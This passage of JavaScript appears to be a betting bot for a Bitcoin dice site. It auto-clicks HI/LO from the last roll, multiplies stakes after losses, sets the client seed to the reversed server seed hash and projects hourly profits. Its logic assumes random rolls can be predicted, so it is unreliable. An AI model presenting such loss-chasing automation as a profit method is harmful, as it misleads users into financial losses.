        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '060') && num_060.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '060') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '065') && num_065.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '065') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '067') && num_067.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '067') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '069') && num_069.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '069') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '071') && num_071.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '071') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '074') && num_074.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '074') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '077') && num_077.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '077') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '080') && num_080.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '080') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '081') && num_081.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '081') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '083') && num_083.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '083') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '091') && num_091.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '091') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '092') && num_092.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '092') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '096') && num_096.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '096') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '097') && num_097.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '097') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '098') && num_098.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '098') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '099') && num_099.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '099') {
        nonExclusiveClickLO()
    }
    if (vLastRollABC >= 900) {
        HI.click()
    }
    if (vLastRollABC >= 100) {
        LO.click()
    }
    return
}
var i = 0;
function RunBTCScript() {
    var charSetB = 'F0598';
    var randomStringB = '';
    for (var ibb = 0; ibb < 4; ibb++) {
        var randomPozB = Math.floor(Math.random() * charSetB.length);
        randomStringB += charSetB.substring(randomPozB, randomPozB + 1)
    }
    function reverseString(str) {
        return str.split("").reverse().join("")
    }
    var rvseed = reverseString($('#next_server_seed_hash').val());
    $('#next_client_seed').val(rvseed);
    AutoRounds = parseFloat(document.getElementsByName('AutoRounds')[0].value);
    AutoTime = parseFloat(document.getElementsByName('AutoTime')[0].value);
    AMBUSH_Amount = parseFloat(document.getElementsByName('AMBUSH_Amount')[0].value);
    AMBUSH_BET = parseFloat(document.getElementsByName('AMBUSH_BET')[0].value);
    BACCARAT_Set = document.getElementsByName("BACCARAT_Set")[0].value.split(',').map(Number);
    FIBONACCI_Multiply = parseFloat(document.getElementsByName('FIBONACCI_Multiply')[0].value);
    FIBONACCI_Payout = parseFloat(document.getElementsByName('FIBONACCI_Payout')[0].value);
    BET = parseFloat(document.getElementsByName('BET')[0].value);
    Multiply_Stake_on_LOST = parseFloat(document.getElementsByName('Multiply_Stake_on_LOST')[0].value);
    PAYOUT_Multiply_on_WIN_Stake = parseFloat(document.getElementsByName('PAYOUT_Multiply_on_WIN_Stake')[0].value);
    PAYOUT_Multiply_on_LOST_Stake = parseFloat(document.getElementsByName('PAYOUT_Multiply_on_LOST_Stake')[0].value);
    PAYOUT_Multiply_on_Danger_Stake = parseFloat(document.getElementsByName('PAYOUT_Multiply_on_Danger_Stake')[0].value);
    PAYOUT_MAX = parseFloat(document.getElementsByName('PAYOUT_MAX')[0].value);
    PAYOUT_MIN = parseFloat(document.getElementsByName('PAYOUT_MIN')[0].value);
    PAYOUT_LOWEST = parseFloat(document.getElementsByName('PAYOUT_LOWEST')[0].value);
    ALARM = parseFloat(document.getElementsByName('ALARM')[0].value);
    STOPLOSS = parseFloat(document.getElementsByName('STOPLOSS')[0].value);
    Reset_Lost_Stake_when = parseFloat(document.getElementsByName('Reset_Lost_Stake_when')[0].value);
    Downgrade_Lost_Multiply_At = parseFloat(document.getElementsByName('Downgrade_Lost_Multiply_At')[0].value);
    Alarm_Multiply = parseFloat(document.getElementsByName('Alarm_Multiply')[0].value);
    USD = parseFloat(document.getElementsByName('USD')[0].value);
    if (document.getElementById('double_your_btc_error').style.display == 'none') {} else {
        STOP = 1;
        gsaudioD.play();
        document.getElementsByName("scINFO")[0].value = 'GAME OVER';
        return
    }
    TimeNow = Math.round(new Date().getTime() / 1000);
    TimeSince = TimeNow - TimeStart;
    BACCARAT_Pointer = i % BACCARAT_Set.length;
    checkLost();
    selectWhatToClick();
    if (i >= 1 && lostColor == 'red' && dangerStake >= ALARM) {
        document.getElementsByName("scINFO")[0].value = 'Profit: ' + parseFloat(currentProfit).toFixed(8) + ' BTC / ' + parseFloat(currentProfit * USD).toFixed(8) + ' USD' + '\n' + 'Immature: ' + parseFloat(currentProfit / TimeSince * 60 * 60 * USD).toFixed(2) + ' USD/1h | ' + parseFloat(currentProfit / TimeSince * 60 * 60 * 24 * USD).toFixed(2) + ' USD/24h' + '\n' + 'Current lost is ' + parseRollHistory[3].childNodes[0].childNodes[6].innerText + '\n' + 'You have exceeded ALARM limit (' + ALARM.toFixed(8) + ')' + '\n' + 'AutoRounds has been stopped';
        return
    }
    if (i <= 1 && FIBONACCI) {
        FIBONACCI_Start_Bet.click()
    }
    document.getElementsByName("scINFO")[0].value = 'Profit: ' + parseFloat(currentProfit).toFixed(8) + ' BTC / ' + parseFloat(currentProfit * USD).toFixed(8) + ' USD' + '\n' + 'Immature: ' + parseFloat(currentProfit / TimeSince * 60 * 60 * USD).toFixed(2) + ' USD/1h | ' + parseFloat(currentProfit / TimeSince * 60 * 60 * 24 * USD).toFixed(2) + ' USD/24h';
    if (i >= 2 && currentProfit <= STOPLOSS) {
        STOP = 1;
        document.getElementsByName("scINFO")[0].value = 'Profit: ' + parseFloat(currentProfit).toFixed(8) + ' BTC / ' + parseFloat(currentProfit * USD).toFixed(8) + ' USD' + '\n' + 'Immature: ' + parseFloat(currentProfit / TimeSince * 60 * 60 * USD).toFixed(2) + ' USD/1h | ' + parseFloat(currentProfit / TimeSince * 60 * 60 * 24 * USD).toFixed(2) + ' USD/24h' + '\n' + '>>>>> !! STOPLOSS !! <<<<<'
    }
    i++;
    if (i + 1 < AutoRounds && STOP == 0) {
        document.getElementsByName("scINFO")[0].value = 'Profit: ' + parseFloat(currentProfit).toFixed(8) + ' BTC / ' + parseFloat(currentProfit * USD).toFixed(8) + ' USD' + '\n' + 'Immature: ' + parseFloat(currentProfit / TimeSince * 60 * 60 * USD).toFixed(2) + ' USD/1h | ' + parseFloat(currentProfit / TimeSince * 60 * 60 * 24 * USD).toFixed(2) + ' USD/24h' + '\n' + 'Run ' + i + ' from ' + AutoRounds + ' in ' + TimeSince + ' seconds / ' + 'approximately ' + (parseFloat(TimeSince / 60).toFixed(0)) + ' minutes';
        setTimeout(RunBTCScript, AutoTime)
    }
}
